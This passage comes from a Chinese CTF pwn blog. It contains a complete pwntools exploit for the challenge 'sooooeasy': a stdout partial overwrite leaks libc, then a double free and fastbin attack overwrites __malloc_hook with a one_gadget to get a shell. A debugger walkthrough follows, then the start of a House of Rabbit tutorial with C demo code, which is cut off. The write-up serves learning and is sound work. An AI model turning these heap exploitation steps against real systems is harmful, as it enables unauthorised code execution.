the “_IO_2_1_stdout - 0x43” (1/16)</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># chunk0</span></span><br><span class="line">	add(<span class="number">0x90</span>) <span class="comment"># chunk1</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># chunk2</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">	add(<span class="number">0x60</span>,p16((<span class="number">2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s-<span class="number">0x43</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Double free to leak libc_base</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	libcbase=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c5600</span></span><br><span class="line">	libc_realloc = libcbase + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">	malloc_hook = libcbase + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">	one = libcbase + [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>][<span class="number">1</span>]</span><br><span class="line">	pr(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">	pr(<span class="string">&#x27;malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">	pr(<span class="string">&#x27;one&#x27;</span>,one)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Double free + fastbin attack to get shell</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">11</span>+p64(one)+p64(libc_realloc+<span class="number">13</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">global</span> p</span><br><span class="line">		p = process(<span class="string">&#x27;./sooooeasy&#x27;</span>)</span><br><span class="line">		pwn()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">		</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;trying...&#x27;</span></span><br></pre></td></tr></table></figure>
<p>接下来就来分析大佬的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># over the “_IO_2_1_stdout - 0x43” (1/16)</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># chunk0</span></span><br><span class="line">add(<span class="number">0x90</span>) <span class="comment"># chunk1</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># chunk2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] <span class="comment"># 覆写末尾3字节</span></span><br><span class="line">add(<span class="number">0x60</span>,p16((<span class="number">2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s-<span class="number">0x43</span>) &amp; <span class="number">0xFFF</span>))) <span class="comment"># chunk1_new</span></span><br></pre></td></tr></table></figure>
<p>delete(1) 执行后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x558b8a0970d0</span></span><br><span class="line"><span class="function">Size: 0xa1</span></span><br><span class="line"><span class="function">fd: 0x7f8d183d8b78</span></span><br><span class="line"><span class="function">bk: 0x7f8d183d8b78</span></span><br></pre></td></tr></table></figure>
<p>add(0x60,p16((2 &lt;&lt; 12) + ((_IO_2_1_stdout_s-0x43) &amp; 0xFFF))) 执行后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x558b8a0970d0</span> <span class="comment">// chunk_block1_new</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x558b8a097100 <span class="comment">// chunk_block1_new-&gt;name</span></span></span><br><span class="line"><span class="function">Size: 0x71</span></span><br><span class="line"><span class="function">fd: 0x7f8d183d8b78 <span class="comment">// 将会被覆写3字节(GDB似乎搞错了断点的位置,很奇怪)</span></span></span><br><span class="line"><span class="function">bk: 0x7f8d183d8b78</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x558b8a097100</span> <span class="comment">// 把断点打在后面,GDB才执行了这一步</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x558b8a097100</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x558b8a097108</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x558b8a097110</span> ◂— <span class="number">0x7f8d183d0a30</span> <span class="comment">// 成功覆盖</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x558b8a097118</span> —▸ <span class="number">0x7f8d183d8b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x558b8a097210</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>​        // GDB有时不能正确执行我们需要的指令，这里需要注意</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># Double free to leak libc_base</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">libcbase=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c5600</span></span><br><span class="line">libc_realloc = libcbase + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">malloc_hook = libcbase + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one = libcbase + [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>][<span class="number">1</span>]</span><br><span class="line">pr(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">pr(<span class="string">&#x27;malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">pr(<span class="string">&#x27;one&#x27;</span>,one)</span><br></pre></td></tr></table></figure>
<p>Double free 完成后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span>: <span class="number">0x564859f8a030</span> —▸ <span class="number">0x564859f8a1a0</span> ◂— <span class="number">0x564859f8a030</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x564859f8a030</span> <span class="comment">// chunk_block0-&gt;name</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x564859f8a030</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x564859f8a038</span> ◂— <span class="number">0x71</span> <span class="comment">/* &#x27;q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x564859f8a040</span> —▸ <span class="number">0x564859f8a1a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x564859f8a048</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x564859f8a1a0</span> <span class="comment">// chunk_block2-&gt;name</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x564859f8a1a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x564859f8a1a8</span> ◂— <span class="number">0x71</span> <span class="comment">/* &#x27;q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x564859f8a1b0</span> —▸ <span class="number">0x564859f8a030</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x564859f8a1b8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br></pre></td></tr></table></figure>
<p>接下来在申请了“chunk_block0-&gt;name”后，就可以在里面写写数据，从而改变“chunk_block2-&gt;name”的地址：（这里写入了“\x00”）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span>: <span class="number">0x5602a27a71a0</span> —▸ <span class="number">0x5602a27a7030</span> —▸ <span class="number">0x5602a27a7100</span> ◂— <span class="number">0x7f1f0a9d25dd</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5602a27a7100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5602a27a7100</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5602a27a7108</span> ◂— <span class="number">0x71</span> <span class="comment">/* &#x27;q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5602a27a7110</span> ◂— <span class="number">0x7f1f0a9d25dd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5602a27a7118</span> —▸ <span class="number">0x7f1f0a9ddb78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x5602a27a7240</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5602a27a7120</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>接下来一直申请，就可以劫持到 <code>_IO_2_1_stdout_s</code> ，篡改 <code>_IO_2_1_stdout</code> 的 flags 为 “0x0FBAD1887” ，然后当程序调用 puts 输出任意信息时，就会输出 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 之间的数据，而这之间就有 libc 的指针</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># Double free + fastbin attack to get shell</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">11</span>+p64(one)+p64(libc_realloc+<span class="number">13</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这次直接覆盖“malloc_hook-0x23”，下一次可以申请到“malloc_hook-0x23”</p>
<hr>
<p><strong>小结：</strong></p>
<p>本题目的难点就在于没有打印模块，需要利用 <code>_IO_2_1_stdout_</code> 的机制（这也是我第一次遇到通过 <code>_IO_2_1_stdout_</code> 来打印信息的题目，以后学一学），抛开这一点不谈，本题目还开放了一下我的“脑洞”：</p>
<ul>
<li>覆盖“main_arena+88”低地址来爆破“libc库函数”的操作（有House Of Roman的味道）</li>
<li>利用 Double free 间接插入“不确定地址”的操作（改变FD指向）</li>
<li>还有一种快速获取目标低地址的操作</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/House%20Of%20Rabbit-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/12/House%20Of%20Rabbit-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Rabbit-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-12 17:09:45" itemprop="dateCreated datePublished" datetime="2022-03-12T17:09:45+08:00">2022-03-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-06 14:42:10" itemprop="dateModified" datetime="2022-04-06T14:42:10+08:00">2022-04-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Rabbit"><a href="#House-Of-Rabbit" class="headerlink" title="House Of Rabbit"></a>House Of Rabbit</h2><p>House of rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中</p>
<p>核心：利用 fastbin consolidate 使 fastbin 中的 fake chunk 合法化</p>
<p>利用点：我们知道，fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出，而 house of rabbit 就利用了程序在 fastbin consolidate 的时候 ，没有对 size 进行检查</p>
<p>两种常见的利用手段：</p>
<ul>
<li>修改fastbin chunk的大小：直接构造 overlap chunk，通过 fastbin consolidate 使其合法化</li>
<li>修改FD指针：让 chunk-&gt;FD 指向一个 fake chunk，触发 fastbin consolidate 之后让这个 fake chunk 成为一个合法的 chunk（注意一下fake chunk的排列，不然会在consolidate时报错）</li>
</ul>
<hr>
<h2 id="House-Of-Rabbit-利用姿势"><a href="#House-Of-Rabbit-利用姿势" class="headerlink" title="House Of Rabbit 利用姿势"></a>House Of Rabbit 利用姿势</h2><p><strong>修改fastbin chunk的大小：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk4;</span><br><span class="line">       </span><br><span class="line">       <span class="built_in">free</span>(chunk1);</span><br><span class="line">       <span class="built_in">free</span>(chunk2);</span><br><span class="line">       chunk1[<span class="number">-1</span>]=<span class="number">0xa1</span>;</span><br><span class="line">       chunk4=<span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发fastbin合并</span></span><br><span class="line">       </span><br><span class="line">       chunk1[<span class="number">0</span>]=<span class="string">&quot;chunk1&quot;</span>;</span><br><span class="line">       chunk2[<span class="number">0</span>]=<span class="string">&quot;chunk2&quot;</span>;</span><br><span class="line">       chunk3[<span class="number">0</span>]=<span class="string">&quot;chunk3&quot;</span>;</span><br><span class="line">       chunk4[<span class="number">0</span>]=<span class="string">&quot;chunk4&quot;</span>;      </span><br><span class="line">       </span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555555b000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555555b000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555555b008</span> ◂— <span class="number">0xa1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555555b010</span> —▸ <span class="number">0x555555556004</span> ◂— <span class="number">0x6300316b6e756863</span> <span class="comment">/* &#x27;chunk1&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55555555b018</span> —▸ <span class="number">0x7ffff7dd1c08</span> (main_arena+<span class="number">232</span>) —▸ <span class="number">0x7ffff7dd1bf8</span> (main_arena+<span class="number">216</span>) —▸ <span class="number">0x7ffff7dd1be8</span> (main_arena+<span class="number">200</span>) —▸ <span class="number">0x7ffff7dd1bd8</span> (main_arena+<span class="number">184</span>) ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55555555b020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55555555b040</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x55555555b058</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x55555555b060</span> —▸ <span class="number">0x55555555600b</span> ◂— <span class="number">0x6300326b6e756863</span> <span class="comment">/* &#x27;chunk2&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x55555555b068</span> —▸ <span class="number">0x7ffff7dd1bb8</span> (main_arena+<span class="number">152</span>) —▸ <span class="number">0x7ffff7dd1ba8</span> (main_arena+<span class="number">136</span>) —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">120</span>) —▸ <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">104</span>) ◂— ...</span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x55555555b070</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x55555555b078</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x55555555b080</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x55555555b0a0</span> ◂— <span class="number">0xa0</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x55555555b0a8</span> ◂— <span class="number">0x20</span> <span class="comment">/* &#x27; &#x27; */</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x55555555b0b0</span> —▸ <span class="number">0x555555556012</span> ◂— <span class="number">0x6300336b6e756863</span> <span class="comment">/* &#x27;chunk3&#x27; */</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x55555555b0b8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│     <span class="number">0x55555555b0c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│     <span class="number">0x55555555b0c8</span> ◂— <span class="number">0x1011</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│ rax <span class="number">0x55555555b0d0</span> —▸ <span class="number">0x555555556019</span> ◂— <span class="number">0x100346b6e756863</span> <span class="comment">/* &#x27;chunk4&#x27; */</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│     <span class="number">0x55555555b0d8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>chunk1辐射的区域：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">7</span>]: <span class="number">0x55555555b000</span>+<span class="number">0xa0</span></span><br><span class="line">Out[<span class="number">7</span>]: <span class="number">93824992260256</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: hex(<span class="number">93824992260256</span>)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">&#x27;0x55555555b0a0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>chunk2辐射的区域：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">9</span>]: <span class="number">0x55555555b050</span>+<span class="number">0x50</span></span><br><span class="line">Out[<span class="number">9</span>]: <span class="number">93824992260256</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: hex(<span class="number">93824992260256</span>)</span><br><span class="line">Out[<span class="number">10</span>]: <span class="string">&#x27;0x55555555b0a0&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>修改FD指针：</strong>（如果集齐了这些条件，打Double free肯定优于它）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk3;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk4;</span><br><span class="line"></span><br><span class="line">	chunk1[<span class="number">0</span>]=<span class="string">&quot;chunk1&quot;</span>;</span><br><span class="line">	chunk2[<span class="number">0</span>]=<span class="string">&quot;chunk2&quot;</span>;</span><br><span class="line">	chunk2[<span class="number">1</span>]=<span class="number">0x31</span>; <span class="comment">// fake chunk1-&gt;size 0x30</span></span><br><span class="line">	chunk2[<span class="number">7</span>]=<span class="number">0x21</span>; <span class="comment">// fake chunk2-&gt;size 0x20 </span></span><br><span class="line">	chunk2[<span class="number">11</span>]=<span class="number">0x21</span>; <span class="comment">// fake chunk3-&gt;size 0x20</span></span><br><span class="line">	<span class="comment">/* P位都必须为&#x27;1&#x27;(fastbin chunk的P位总是为&#x27;1&#x27;) */</span></span><br><span 